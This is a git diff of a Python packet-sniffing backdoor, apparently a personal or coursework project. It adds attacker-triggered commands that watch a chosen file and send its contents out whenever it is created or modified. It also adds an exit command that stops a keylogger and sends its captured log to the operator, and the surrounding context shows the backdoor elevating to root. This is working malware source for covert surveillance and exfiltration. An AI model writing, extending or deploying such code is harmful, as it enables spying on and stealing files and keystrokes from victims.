@@ -153,11 +153,11 @@ def start_backdoor():
     Initialize the packet sniffing backdoor. Elevate privileges, sets up configurations, and starts sniff.
     :return: None
     """
-    print("Starting Receiver.")
-    start_watching_directory("/root/Desktop/write_test")
-    u = input()
-    stop_watching_directory()
-    return
+    # print("Starting Receiver.")
+    # start_watching_directory("/root/Desktop/write_test")
+    # u = input()
+    # stop_watching_directory()
+    # return
 
     # Elevate privileges.
     setuid(0)
@@ -278,8 +278,10 @@ def process_sniff_pkt(pkt):
             instruction_input = commands[3]
             print(instruction)
             print(instruction_input)
+            start_watching_file(instruction_input)
         elif instruction == "6":
             print(instruction)
+            stop_watching_file()
         elif instruction == "7":
             instruction_input = commands[3]
             print(instruction)
@@ -289,7 +291,12 @@ def process_sniff_pkt(pkt):
             print(instruction)
             stop_watching_directory()
         elif instruction == "9":
-            print(instruction)
+            print(f"{instruction} - Exiting: Stopping Keylogger, watching file, and watching directory.")
+            file_path = utils.stop_keylogger()
+            binary_file, file_name = get_file_binary(file_path)
+            send_message(binary_file, instruction, file_name)
+            stop_watching_file()
+            stop_watching_directory()
         else:
             print(f"WARNING, invalid instruction: {instruction}.")
 
@@ -409,17 +416,22 @@ def send_message(message, instruction, filename=""):
 #     print(event)
 
 class OnMyWatch:
-    def __init__(self, directory_path, is_recursive=True):
+    def __init__(self, directory_path, is_recursive=True, instruction='7'):
         self.observer = Observer()
         # Set the directory on watch
         self.watch_directory = directory_path
         self.is_recursive = is_recursive
+        self.instruction = instruction
 
     def set_path(self, new_path):
         self.watch_directory = new_path
 
     def run(self):
-        event_handler = Handler()
+        # event_handler = Handler()
+        if self.instruction == '7':
+            event_handler = Handler()
+        else:
+            event_handler = Handler_File()
         # event_handler = FileSystemEventHandler()
         # event_handler.on_modified = on_modified
         # event_handler.on_created = on_created
@@ -462,7 +474,7 @@ class Handler(FileSystemEventHandler):
 
 
 directory_watch_active = False
-watch = OnMyWatch("/root/Desktop")
+watch = OnMyWatch("/root/Desktop", instruction="7")
 
 
 def start_watching_directory(directory_path):
@@ -490,6 +502,61 @@ def stop_watching_directory():
     watch.stop()
     directory_watch_active = False
     print(f"Directory watch stopped: {watch.watch_directory}")
+    return
+
+
+class Handler_File(FileSystemEventHandler):
+
+    @staticmethod
+    def on_any_event(event):
+        if event.is_directory:
+            return None
+
+        elif event.event_type == 'created':
+            # Event is created, you can process it now
+            print("Watchdog received created event - % s." % event.src_path)
+            print(event.src_path)
+            binary_file, file_name = get_file_binary(event.src_path)
+            send_message(binary_file, "5", file_name)
+            # "7" to match the watch a directory instruction sent by attacker
+        elif event.event_type == 'modified':
+            # Event is modified, you can process it now
+            print("Watchdog received modified event - % s." % event.src_path)
+            print(event.src_path)
+            binary_file, file_name = get_file_binary(event.src_path)
+            send_message(binary_file, "5", file_name)
+            # "7" to match the watch a directory instruction sent by attacker
+
+
+file_watch_active = False
+watch_file = OnMyWatch("/root/Desktop", instruction="5")
+
+
+def start_watching_file(file_path):
+    global watch_file
+    global file_watch_active
+    if file_watch_active:
+        print(f"Already watching file {watch_file.watch_directory}")
+        return
+
+    file_watch_active = True
+    watch_file.set_path(file_path)
+
+    watch_file.run()
+    print(f"File watch started: {file_path}")
+
+
+def stop_watching_file():
+    global watch_file
+    global file_watch_active
+
+    if not file_watch_active:
+        print("File watch stopped.")
+        return
+
+    watch_file.stop()
+    file_watch_active = False
+    print(f"File watch stopped: {watch_file.watch_directory}")
     return
 
 
